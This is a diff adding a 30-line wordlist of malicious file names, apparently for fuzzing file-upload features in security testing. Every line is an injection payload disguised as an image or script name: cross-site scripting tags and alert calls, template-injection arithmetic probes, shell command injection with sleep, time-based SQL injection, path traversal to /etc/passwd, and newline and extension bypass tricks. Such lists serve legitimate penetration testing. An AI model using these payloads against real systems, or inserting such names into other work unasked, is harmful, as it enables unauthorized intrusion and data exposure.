@@ -1,0 +1,30 @@
+\"><img/src=1>.jpg
+'\"><img src=1>.png
+${10000+1}.jpg
+{{10000+1}}.jpg
+${10001*2}.jpg
+{{10001*2}}.jpg
+aaa&quot;&gt;&lt;img src=1&gt;.jpg
+'-confirm`1`-'.jpg
+&apos;-alert(1)-&apos;.jpg
+`sleep 10`111.jpg
+||sleep 3.jpg
+;sleep 3;.jpg
+../../etc/passwd/logo.jpg
+$(sleep 3).jpg
+../../../../../favicon.ico.jpg
+\";sleep 3.jpg
+1&sleep 3.jpg
+poc.js.'+(select*from(select(sleep(3)))aaa)+'.jpg
+poc.js.'-sleep(3)-'.jpg
+poc.js.'+sleep(3)+'.jpg
+poc.'xor sleep(3) or'.jpg
+poc./*'xor sleep(3) or'*/.jpg
+poc.js.'xor 1 or'.jpg
+poc.js.'xor sleep(3) or'.jpg
+badfile.''gif.jpg
+badfile.''jpg.jpg
+file.js%0a%0d.jpg
+file.js/1.jpg
+.jpg
+.js
